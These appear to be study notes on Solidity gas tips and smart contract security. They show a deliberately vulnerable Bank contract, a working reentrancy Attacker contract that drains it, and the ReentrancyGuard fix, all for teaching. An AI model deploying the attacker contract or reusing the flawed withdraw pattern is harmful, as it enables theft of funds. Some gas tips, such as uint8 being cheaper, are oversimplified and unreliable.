# Smart contract gas optimization

- uint8 saves gas than uint256

- Avoid loops

- Since, there are no floating points in solidity, use decimals to handle it. Beware that in division, Num>Den

- public state variables consume gas

- Extra text in return consumes gas 

- Events can be used to read variables which are only needed to be read by developer, not the user







# Smart contract security

- Use CEI withdrawal pattern(Check, Effects and Interaction) to prevent reentrancy

- block.timestamp can be manipulated by miners since they can change order of transactions. It is therefore recommended that instead we should use external time oracles

## What is reentrancy ?

Its calling any function of a smart contract while that function is being called. 

Mostly this function is the withdraw function. 

## Suppose there is a bank account smart contract which is vulnerable 

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract Bank {
    using Address for address payable;

    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 depositedAmount = balanceOf[msg.sender];
        payable(msg.sender).sendValue(depositedAmount);
        balanceOf[msg.sender] = 0;
    }
}


## Now the attacker can make a smart contract to attack the bank smart contract which calls the deposit and withdraw functions simultaneously. And it keeps recieving the funds till the balance of the bank is exhausted 

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IBank {
  function deposit() external payable;
  function withdraw() external;
}

contract Attacker is Ownable {
  IBank public immutable bankContract;

  constructor(address bankContractAddress) {
    bankContract = IBank(bankContractAddress);
  }

  function attack() external payable onlyOwner {
    bankContract.deposit{ value: msg.value }();
    bankContract.withdraw();
  }

  receive() external payable {
    if (address(bankContract).balance > 0) {
      bankContract.withdraw();
    } else {
      payable(owner()).transfer(address(this).balance);
    }
  }
}


## How is the reentrancy done in this case ?

First of all the attacker calls the attack function which calls the deposit and withdraw function of the bank contract. 

As soon as the withdraw function is executed, the recieve function of attacker smart contract is executed. And that smart contract runs a loop of withdraw function till the balance is exhausted. 

Then all the balance of the contract is transferred to the attacker account (owner of the attack smart contract)



## How to protect smart contracts from reentrancy ?

- import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

- contract Bank is ReentrancyGuard {

- attach nonReentrant to withdraw function to protect against reentrancy 
(Inside the library, there is a simple variable whose value is set to 1 and 2 when we use the withdraw once, the value changes to 2. Any calls after the first call will fail)
..}


